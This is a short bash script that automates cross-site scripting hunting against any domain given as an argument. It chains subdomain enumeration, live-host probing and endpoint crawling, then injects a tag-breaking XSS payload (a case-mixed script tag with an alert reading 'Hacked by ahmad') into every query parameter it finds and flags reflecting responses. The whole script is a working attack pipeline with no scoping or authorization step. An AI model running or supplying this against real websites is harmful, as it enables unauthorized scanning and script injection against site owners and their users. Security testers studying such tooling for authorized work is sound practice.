#!/bin/bash

# Check if a target was provided
if [ "$#" -ne 1 ]; then
    echo "Usage: $0 <target.com>"
    exit 1
fi

TARGET="$1"

# Step 1: Find subdomains
subfinder -d "$TARGET" -all -o subdomains.txt

# Step 2: Check for live hosts
cat subdomains.txt | httprobe | tee -a host.txt

# Step 3: Crawl for endpoints
cat host.txt | hakrawler | tee -a endpoint.txt
cat host.txt | waybackurls | tee -a endpoint.txt

# Step 4: Inject XSS payloads and check for potential vulnerabilities
cat endpoint.txt | qsreplace "%27\"></a></script></title></form></span></meta></style></iframe></noscript></textarea></xmp></pre><ScRiPt>alert(/Hacked%20by%20ahmad/)</sCrlpT>" | tee -a xss_fuzz.txt

# Step 5: Analyze the fuzzed URLs for potential XSS
cat xss_fuzz.txt | freq | tee -a possible_xss.txt

echo "Process completed. Check possible_xss.txt for potential vulnerabilities."
